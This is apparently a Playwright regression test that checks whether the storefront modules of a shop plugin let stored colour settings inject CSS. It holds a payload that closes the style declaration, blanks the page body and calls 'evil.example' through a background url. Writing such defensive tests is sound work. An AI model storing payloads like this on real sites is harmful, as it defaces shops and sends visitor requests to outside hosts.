import { test, expect } from '../../fixtures/test';
import { setModuleActive, moduleAjax } from '../../helpers/ajax';
import { gotoProduct } from '../../helpers/storefront';
import { MODULES } from '../../data/modules';
import { PRODUCTS } from '../../data/products';

// Regression guard for issue #257 — storefront defacement via CSS injection.
//
// Every module that emits an inline <style> block interpolated stored colour and
// size settings raw. A stored value that closes the declaration (`#fff} body{…`)
// therefore appended arbitrary rules to a stylesheet served to every visitor, so
// an admin-authored option could blank the shop or fire an outbound request per
// page view. PR #556 hardened only floating-notification-bar; the six modules
// below still shipped the pre-fix shape.
//
// The payload below is stored through each module's own save endpoint — the
// normal admin path. `sanitize_text_field()` strips tags but keeps `{`, `}` and
// `;`, so this is exactly what reaches the option in production.
//
// Each case stores the payload, loads the storefront, and asserts the breakout
// never reaches the served CSS and the page still renders.

const CANARY = 'spsg-css-injection-canary';
const PAYLOAD = `#fff} body{display:none !important} .${CANARY}{background:url(https://evil.example/?leak=1)} .z{color:#fff`;

type Target = {
  label: string;
  moduleId: string;
  /** Save the given colour value into every colour key this module writes into CSS. */
  save: (page: any, value: string) => Promise<void>;
};

/** Handlers taking `form_data` as a flat array (array_map + sanitize_form_fields). */
const arraySave =
  (action: string, keys: string[], extra: Record<string, string> = {}) =>
  async (page: any, value: string) => {
    const form_data: Record<string, string> = { ...extra };
    for (const k of keys) form_data[k] = value;
    await moduleAjax(page, action, { form_data });
  };

/** Handlers taking `form_data` as a JSON *string* under a wrapper key. */
const jsonSave =
  (action: string, wrapper: string, keys: string[]) =>
  async (page: any, value: string) => {
    const inner: Record<string, string> = {};
    for (const k of keys) inner[k] = value;
    await moduleAjax(page, action, { form_data: JSON.stringify({ [wrapper]: inner }) });
  };

/** Direct Checkout reads `data` as a JSON string under `direct_checkout_data`. */
const directCheckoutSave =
  (keys: string[]) =>
  async (page: any, value: string) => {
    const inner: Record<string, string> = { button_style: '1' };
    for (const k of keys) inner[k] = value;
    await moduleAjax(page, 'spsg_direct_checkout_save_settings', {
      data: JSON.stringify({ direct_checkout_data: inner }),
    });
  };

const TARGETS: Target[] = [
  {
    label: 'Progressive Discount Banner',
    moduleId: MODULES.freeShipping.id,
    save: jsonSave('spsg_pd_banner_save_settings', 'shipping_bar_data', [
      'background_color',
      'text_color',
      'icon_color',
      'close_icon_color',
      'banner_height',
      'font_size',
    ]),
  },
  {
    label: 'Floating Notification Bar',
    moduleId: MODULES.floatingBar.id,
    save: jsonSave('spsg_floating_notification_bar_save_settings', 'shipping_bar_data', [
      'background_color',
      'text_color',
      'icon_color',
      'close_icon_color',
      'button_color',
      'button_text_color',
      'banner_height',
      'font_size',
    ]),
  },
  {
    label: 'Countdown Timer',
    moduleId: MODULES.countdownTimer.id,
    // Colours only reach the CSS on the `ct-layout-1` theme.
    save: arraySave(
      'spsg_countdown_timer_save_settings',
      ['widget_background_color', 'border_color', 'heading_text_color'],
      { selected_theme: 'ct-layout-1' },
    ),
  },
  {
    label: 'Fly Cart',
    moduleId: MODULES.flyCart.id,
    save: arraySave('spsg_fly_cart_save_settings', [
      'icon_color',
      'widget_bg_color',
      'product_card_bg_color',
      'buttons_bg_color',
      'shopping_button_bg_color',
    ]),
  },
  {
    label: 'Direct Checkout',
    moduleId: MODULES.directCheckout.id,
    save: directCheckoutSave(['button_color', 'text_color', 'font_size', 'button_border_radius']),
  },
  {
    label: 'Stock Bar',
    moduleId: MODULES.stockBar.id,
    save: arraySave(
      'spsg_stock_bar_save_settings',
      ['stockbar_bg_color', 'stockbar_fg_color', 'stockbar_border_color', 'stockbar_height'],
      { product_page_stock_bar_enable: '1' },
    ),
  },
  {
    label: 'Quick View',
    moduleId: MODULES.quickView.id,
    save: arraySave('spsg_quick_view_save_settings', [
      'modal_background_color',
      'button_color',
      'button_text_color',
      'button_border_radius',
    ]),
  },
];

test.describe('Storefront · stored settings cannot inject CSS', { tag: '@ui' }, () => {
  for (const t of TARGETS) {
    test(`${t.label} does not let a stored colour break out of its <style> block`, async ({
      page,
    }) => {
      await setModuleActive(page, t.moduleId, true);

      try {
        await t.save(page, PAYLOAD);
        await gotoProduct(page, PRODUCTS.a.slug);

        const html = await page.content();

        // The breakout rules must never reach the served stylesheet.
        expect(html, `${t.label} leaked the injected selector into the page`).not.toContain(CANARY);
        expect(html, `${t.label} leaked a display:none breakout into the page`).not.toContain(
          'body{display:none',
        );

        // ...and the storefront still renders.
        const display = await page.evaluate(() => getComputedStyle(document.body).display);
        expect(display, `${t.label} blanked the storefront`).not.toBe('none');
        await expect(page.locator('body')).toBeVisible();
      } finally {
        // Leave-as-found: restore a valid colour and the module's active state.
        await t.save(page, '#ffffff');
        await setModuleActive(page, t.moduleId, true);
      }
    });
  }
});
